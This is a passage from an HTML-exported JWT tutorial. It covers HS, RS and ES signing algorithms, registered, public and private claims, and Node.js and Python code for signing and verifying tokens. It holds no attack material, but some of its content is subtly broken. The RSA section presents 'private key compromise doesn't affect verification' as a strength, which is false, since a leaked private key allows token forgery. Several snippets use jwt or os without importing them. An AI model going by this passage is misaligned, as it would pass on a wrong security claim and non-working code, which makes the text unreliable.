style="list-style-type:disc">⚠️ Secret key compromise affects all tokens</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d7-ac98-efa1c3bb4387" class="bulleted-list"><li style="list-style-type:disc">⚠️ Key must be securely stored and shared</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8072-b5c7-c229d143ba0c" class=""><strong>2. RSA (Asymmetric)</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80af-a8e4-e2580c72ab4b" class=""><strong>Algorithms:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d3-8433-ecaedd8bf6ce" class="bulleted-list"><li style="list-style-type:disc"><code>RS256</code>: RSASSA-PKCS1-v1_5 using SHA-256</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8075-a8fb-e744e998f47c" class="bulleted-list"><li style="list-style-type:disc"><code>RS384</code>: RSASSA-PKCS1-v1_5 using SHA-384</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8057-b928-d62880caab6b" class="bulleted-list"><li style="list-style-type:disc"><code>RS512</code>: RSASSA-PKCS1-v1_5 using SHA-512</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-809c-98aa-dcf270328676" class=""><strong>Full Name:</strong> Rivest-Shamir-Adleman</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-801e-a8f9-c77a35533dfc" class=""><strong>How it works:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8080-a65d-fb286d283b90" class="bulleted-list"><li style="list-style-type:disc">Private key used for signing (kept secret)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8016-8aeb-dd3180fcc4eb" class="bulleted-list"><li style="list-style-type:disc">Public key used for verification (can be shared)</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bb-a7b8-cf452a8aafb9" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-804c-bd70-dcdfd10ff68e" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const fs = require(&#x27;fs&#x27;);
+
+// Load keys
+const privateKey = fs.readFileSync(&#x27;private.pem&#x27;, &#x27;utf8&#x27;);
+const publicKey = fs.readFileSync(&#x27;public.pem&#x27;, &#x27;utf8&#x27;);
+
+// Sign with private key
+const token = jwt.sign(payload, privateKey, { algorithm: &#x27;RS256&#x27; });
+
+// Verify with public key
+const decoded = jwt.verify(token, publicKey, { algorithms: [&#x27;RS256&#x27;] });
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80cb-bb69-d07a64709acc" class=""><strong>Use Cases:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b5-afaa-de157abe782b" class="bulleted-list"><li style="list-style-type:disc">Multi-server applications</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8007-badb-f54154e18eb2" class="bulleted-list"><li style="list-style-type:disc">Microservices architecture</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8052-9184-e6857b21cd9c" class="bulleted-list"><li style="list-style-type:disc">When verification needs to be done without secret key access</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80b8-8979-e9b4853d0af4" class=""><strong>Security:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d9-a350-c465049d0e7c" class="bulleted-list"><li style="list-style-type:disc">✅ Private key compromise doesn&#x27;t affect verification</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80dc-bff0-e20f22f24a82" class="bulleted-list"><li style="list-style-type:disc">✅ Public key can be distributed widely</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cc-a07a-f7da59f3e346" class="bulleted-list"><li style="list-style-type:disc">⚠️ Slower than HMAC</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8001-a50c-f097da70157b" class="bulleted-list"><li style="list-style-type:disc">⚠️ Requires key pair management</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-802c-bf78-d3ed4df77bd9" class=""><strong>3. ECDSA (Elliptic Curve)</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bb-a479-c736fce8ceaa" class=""><strong>Algorithms:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8006-be63-deba421a3820" class="bulleted-list"><li style="list-style-type:disc"><code>ES256</code>: ECDSA using P-256 and SHA-256</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8086-a9e1-f327d8060704" class="bulleted-list"><li style="list-style-type:disc"><code>ES384</code>: ECDSA using P-384 and SHA-384</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8038-8a1f-f3c0813f22b7" class="bulleted-list"><li style="list-style-type:disc"><code>ES512</code>: ECDSA using P-521 and SHA-512</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8087-bcce-d09eb8acd52b" class=""><strong>Full Name:</strong> Elliptic Curve Digital Signature Algorithm</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80dd-8f6a-de88a76b2cdb" class=""><strong>How it works:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80cf-bd74-da54aa75d800" class="bulleted-list"><li style="list-style-type:disc">Similar to RSA but uses elliptic curve cryptography</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d9-8631-cfafdf62ba14" class="bulleted-list"><li style="list-style-type:disc">Smaller keys for same security level</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d5-aaf9-ec66648ca3c8" class="bulleted-list"><li style="list-style-type:disc">Private key for signing, public key for verification</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8056-8d63-d6b1e45a9647" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80e5-bbde-d80b446f0c71" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const fs = require(&#x27;fs&#x27;);
+
+// Load keys
+const privateKey = fs.readFileSync(&#x27;ec-private.pem&#x27;, &#x27;utf8&#x27;);
+const publicKey = fs.readFileSync(&#x27;ec-public.pem&#x27;, &#x27;utf8&#x27;);
+
+// Sign with private key
+const token = jwt.sign(payload, privateKey, { algorithm: &#x27;ES256&#x27; });
+
+// Verify with public key
+const decoded = jwt.verify(token, publicKey, { algorithms: [&#x27;ES256&#x27;] });
+</code></pre></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8027-bff0-d7deb01a4bd2" class=""><strong>Use Cases:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c0-b2ef-e7cea8602093" class="bulleted-list"><li style="list-style-type:disc">Modern applications requiring efficient cryptography</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8032-a66b-cc6a495b51c1" class="bulleted-list"><li style="list-style-type:disc">Mobile applications (smaller key size)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a1-b254-c6e4ac0f8446" class="bulleted-list"><li style="list-style-type:disc">IoT devices (resource constraints)</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-807d-8122-f04da6e3956a" class=""><strong>Security:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80b7-9197-ff2dd4e0011f" class="bulleted-list"><li style="list-style-type:disc">✅ Smaller keys than RSA for same security</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80da-8f14-d231caf274be" class="bulleted-list"><li style="list-style-type:disc">✅ Faster than RSA</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a8-849f-c704a2913353" class="bulleted-list"><li style="list-style-type:disc">✅ Strong security with smaller keys</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-801e-a23f-c71dd957d7cb" class="bulleted-list"><li style="list-style-type:disc">⚠️ Requires key pair management</li></ul></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8059-b4b9-ee35c4a5bf35" class=""><strong>Algorithm Selection Guide</strong></h3></div><div style="display:contents" dir="ltr"><table id="2cf562ad-76f0-80a8-9137-c31a307f08ae" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80f7-8f15-d031631fcc16"><th id="fLXJ" class="simple-table-header-color simple-table-header">Algorithm</th><th id="vAsx" class="simple-table-header-color simple-table-header">Type</th><th id="jOrN" class="simple-table-header-color simple-table-header">Key Size</th><th id="b:o[" class="simple-table-header-color simple-table-header">Speed</th><th id="MMP=" class="simple-table-header-color simple-table-header">Use Case</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80ab-8488-d52c08ccb180"><td id="fLXJ" class="">HS256</td><td id="vAsx" class="">Symmetric</td><td id="jOrN" class="">256+ bits</td><td id="b:o[" class="">Fast</td><td id="MMP=" class="">Single server, simple auth</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80bd-833a-ddc9ccc76d85"><td id="fLXJ" class="">RS256</td><td id="vAsx" class="">Asymmetric</td><td id="jOrN" class="">2048+ bits</td><td id="b:o[" class="">Medium</td><td id="MMP=" class="">Multi-server, microservices</td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80e4-9297-f443f140513f"><td id="fLXJ" class="">ES256</td><td id="vAsx" class="">Asymmetric</td><td id="jOrN" class="">256 bits</td><td id="b:o[" class="">Fast</td><td id="MMP=" class="">Modern apps, mobile, IoT</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8089-9e2e-ef64315d80fe" class=""><strong>⚠️ CRITICAL: Never use algorithm &#x27;none&#x27;</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80d4-bdf4-ddb276130d89" class="bulleted-list"><li style="list-style-type:disc">The &#x27;none&#x27; algorithm means no signature</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-802f-bb76-fc6c65ff2509" class="bulleted-list"><li style="list-style-type:disc">Extremely dangerous - allows token forgery</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8017-9e76-d305cf17cb0c" class="bulleted-list"><li style="list-style-type:disc">Always whitelist algorithms explicitly</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-809c-8545-c5f3cd361591"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-80bf-aff3-c4062fdeda05" class=""><strong>JWT Claims</strong></h2></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80bf-87e4-f80b6edccf18" class="">Claims are statements about an entity and additional metadata. There are three types of claims:</p></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8006-835a-cefa75dd2cb7" class=""><strong>1. Registered Claims</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8063-8eca-ce9d10debc34" class="">These are pre-defined claims in the JWT specification:</p></div><div style="display:contents" dir="ltr"><table id="2cf562ad-76f0-80b9-8608-d299b0a2989e" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8005-a72a-ed51522f075c"><th id="gLlO" class="simple-table-header-color simple-table-header">Claim</th><th id="h|{B" class="simple-table-header-color simple-table-header">Name</th><th id="ZCUc" class="simple-table-header-color simple-table-header">Description</th><th id="]chO" class="simple-table-header-color simple-table-header">Example</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80ae-9210-fdc8a9742fb9"><td id="gLlO" class=""><code>iss</code></td><td id="h|{B" class="">Issuer</td><td id="ZCUc" class="">Entity that issued the JWT</td><td id="]chO" class=""><code>&quot;iss&quot;: &quot;https://api.example.com&quot;</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80ae-a3bc-ddaca719e4f4"><td id="gLlO" class=""><code>sub</code></td><td id="h|{B" class="">Subject</td><td id="ZCUc" class="">Subject of the JWT (usually user ID)</td><td id="]chO" class=""><code>&quot;sub&quot;: &quot;1234567890&quot;</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8015-a42b-f69a6b6ee641"><td id="gLlO" class=""><code>aud</code></td><td id="h|{B" class="">Audience</td><td id="ZCUc" class="">Intended recipient of the JWT</td><td id="]chO" class=""><code>&quot;aud&quot;: &quot;my-app&quot;</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8094-a19f-e693acbbd02a"><td id="gLlO" class=""><code>exp</code></td><td id="h|{B" class="">Expiration Time</td><td id="ZCUc" class="">Token expiration time (Unix timestamp)</td><td id="]chO" class=""><code>&quot;exp&quot;: 1516242622</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8045-a0dd-f8df78a3fa9b"><td id="gLlO" class=""><code>nbf</code></td><td id="h|{B" class="">Not Before</td><td id="ZCUc" class="">Token not valid before this time</td><td id="]chO" class=""><code>&quot;nbf&quot;: 1516239022</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-80e3-8a8e-e68c75b79127"><td id="gLlO" class=""><code>iat</code></td><td id="h|{B" class="">Issued At</td><td id="ZCUc" class="">Time when token was issued</td><td id="]chO" class=""><code>&quot;iat&quot;: 1516239022</code></td></tr></div><div style="display:contents" dir="ltr"><tr id="2cf562ad-76f0-8023-ac42-e994e903acfd"><td id="gLlO" class=""><code>jti</code></td><td id="h|{B" class="">JWT ID</td><td id="ZCUc" class="">Unique identifier for the JWT</td><td id="]chO" class=""><code>&quot;jti&quot;: &quot;550e8400-e29b-41d4-a716-446655440000&quot;</code></td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80ee-bcdf-eb330ddd5698" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-805f-a20d-e4ff8700febb" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;iss&quot;: &quot;https://api.example.com&quot;,
+  &quot;sub&quot;: &quot;1234567890&quot;,
+  &quot;aud&quot;: &quot;my-app&quot;,
+  &quot;exp&quot;: 1516242622,
+  &quot;nbf&quot;: 1516239022,
+  &quot;iat&quot;: 1516239022,
+  &quot;jti&quot;: &quot;550e8400-e29b-41d4-a716-446655440000&quot;
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8030-8a89-c7fc1a7970ca" class=""><strong>2. Public Claims</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c1-b14b-fcdafe604337" class="">Claims defined in the JWT registry or defined as URIs:</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-803a-9034-c31c2a04f873" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80b6-889e-e4787af4d385" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;email&quot;: &quot;user@example.com&quot;,
+  &quot;email_verified&quot;: true,
+  &quot;name&quot;: &quot;John Doe&quot;
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8087-98d9-ce2904c0f7ca" class=""><strong>3. Private Claims</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80a9-9dbc-e6ab2b27663a" class="">Custom claims specific to your application:</p></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-8090-b35d-e0842e745232" class=""><strong>Common Private Claims:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8069-b3ed-e411c73f0a2f" class="bulleted-list"><li style="list-style-type:disc"><code>userId</code>: User identifier</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8095-a938-c2a454406928" class="bulleted-list"><li style="list-style-type:disc"><code>username</code>: Username</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808e-9cf0-fba31c6d59c7" class="bulleted-list"><li style="list-style-type:disc"><code>role</code>: User role (admin, user, etc.)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8036-bca3-fa6a312209f6" class="bulleted-list"><li style="list-style-type:disc"><code>permissions</code>: Array of permissions</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8037-ad8d-f5171152cb83" class="bulleted-list"><li style="list-style-type:disc"><code>department</code>: User&#x27;s department</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-806d-842c-f92c3f16a189" class="bulleted-list"><li style="list-style-type:disc">Custom business logic data</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80f3-a8c6-f14852f66acf" class=""><strong>Example:</strong></p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80b1-9300-e67057eb48a7" class="code code-wrap"><code class="language-JSON" style="white-space:pre-wrap;word-break:break-all">{
+  &quot;userId&quot;: &quot;123&quot;,
+  &quot;username&quot;: &quot;john&quot;,
+  &quot;role&quot;: &quot;admin&quot;,
+  &quot;permissions&quot;: [&quot;read&quot;, &quot;write&quot;, &quot;delete&quot;],
+  &quot;department&quot;: &quot;engineering&quot;
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-802f-9753-ebaf24702d1e" class=""><strong>⚠️ Important: What NOT to Store in Claims</strong></h3></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80af-93aa-d5274422228a" class=""><strong>Never store sensitive information:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80fa-9d55-c3729130b110" class="bulleted-list"><li style="list-style-type:disc">❌ Passwords or password hashes</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-808b-8795-eb16da2f4f52" class="bulleted-list"><li style="list-style-type:disc">❌ Credit card numbers</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-805d-ab37-d52c67086c03" class="bulleted-list"><li style="list-style-type:disc">❌ Social Security Numbers (SSN)</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80c5-9f20-d9a7f2002948" class="bulleted-list"><li style="list-style-type:disc">❌ Private keys or secrets</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-803f-8bce-c10066ad8df2" class="bulleted-list"><li style="list-style-type:disc">❌ Full personal addresses</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80a1-b98e-c4bbe314e71c" class="bulleted-list"><li style="list-style-type:disc">❌ Medical records</li></ul></div><div style="display:contents" dir="auto"><p id="2cf562ad-76f0-80c3-8ca7-ef2d783c35ac" class=""><strong>Keep payload minimal:</strong></p></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80ad-b2ca-dac760574f52" class="bulleted-list"><li style="list-style-type:disc">✅ Only store what&#x27;s necessary for authorization</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-8071-81a4-e347ca788099" class="bulleted-list"><li style="list-style-type:disc">✅ Store identifiers, not full user objects</li></ul></div><div style="display:contents" dir="auto"><ul id="2cf562ad-76f0-80f1-b9a0-c41a0154ad5f" class="bulleted-list"><li style="list-style-type:disc">✅ Follow principle of least privilege</li></ul></div><div style="display:contents" dir="auto"><hr id="2cf562ad-76f0-802d-aa60-ffdea6902e7e"/></div><div style="display:contents" dir="auto"><h2 id="2cf562ad-76f0-806e-b1eb-f30a58f55d0c" class=""><strong>Creating and Verifying JWTs</strong></h2></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80c4-bbec-d15979a41824" class=""><strong>Creating a JWT</strong></h3></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-8059-b811-e7e2af7d3bba" class=""><strong>Node.js (jsonwebtoken library)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80f3-97e1-e7984011f43f" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const jwt = require(&#x27;jsonwebtoken&#x27;);
+
+// Payload
+const payload = {
+  userId: &#x27;123&#x27;,
+  username: &#x27;john&#x27;,
+  role: &#x27;admin&#x27;,
+  iat: Math.floor(Date.now() / 1000),
+  exp: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour
+};
+
+// Secret key (for HMAC)
+const secret = process.env.JWT_SECRET;
+
+// Create token
+const token = jwt.sign(payload, secret, {
+  algorithm: &#x27;HS256&#x27;,
+  expiresIn: &#x27;1h&#x27;,
+  issuer: &#x27;my-api&#x27;,
+  audience: &#x27;my-app&#x27;
+});
+
+console.log(&#x27;Token:&#x27;, token);
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-800b-ae1c-c5b04b21a053" class=""><strong>Python (PyJWT library)</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80d9-a70d-d6ac8faaff7b" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import jwt
+import datetime
+
+# Payload
+payload = {
+    &#x27;userId&#x27;: &#x27;123&#x27;,
+    &#x27;username&#x27;: &#x27;john&#x27;,
+    &#x27;role&#x27;: &#x27;admin&#x27;,
+    &#x27;iat&#x27;: datetime.datetime.utcnow(),
+    &#x27;exp&#x27;: datetime.datetime.utcnow() + datetime.timedelta(hours=1)
+}
+
+# Secret key
+secret = os.getenv(&#x27;JWT_SECRET&#x27;)
+
+# Create token
+token = jwt.encode(payload, secret, algorithm=&#x27;HS256&#x27;)
+print(f&#x27;Token: {token}&#x27;)
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80dc-8f28-c4ba45b7d63e" class=""><strong>Verifying a JWT</strong></h3></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80df-bcd6-f4ef816b7776" class=""><strong>Node.js</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-8054-a56b-cf402d11fed3" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">const jwt = require(&#x27;jsonwebtoken&#x27;);
+
+const token = &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#x27;;
+const secret = process.env.JWT_SECRET;
+
+try {
+  // Verify and decode
+  const decoded = jwt.verify(token, secret, {
+    algorithms: [&#x27;HS256&#x27;],  // Whitelist algorithms
+    issuer: &#x27;my-api&#x27;,       // Validate issuer
+    audience: &#x27;my-app&#x27;,     // Validate audience
+    maxAge: &#x27;2h&#x27;            // Maximum age
+  });
+
+  console.log(&#x27;Decoded payload:&#x27;, decoded);
+  // Use decoded.userId, decoded.role, etc.
+
+} catch (error) {
+  if (error.name === &#x27;TokenExpiredError&#x27;) {
+    console.error(&#x27;Token has expired&#x27;);
+  } else if (error.name === &#x27;JsonWebTokenError&#x27;) {
+    console.error(&#x27;Invalid token&#x27;);
+  } else {
+    console.error(&#x27;Token verification failed:&#x27;, error.message);
+  }
+}
+</code></pre></div><div style="display:contents" dir="auto"><h3 id="2cf562ad-76f0-80c9-9172-d9f126ae88e1" class=""><strong>Python</strong></h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2cf562ad-76f0-80bd-91b7-c5d6668f49af" class="code code-wrap"><code class="language-Python" style="white-space:pre-wrap;word-break:break-all">import jwt
+
+token = &#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#x27;
+secret = os.getenv(&#x27;JWT_SECRET&#x27;)
+
+try:
+    # Verify and decode
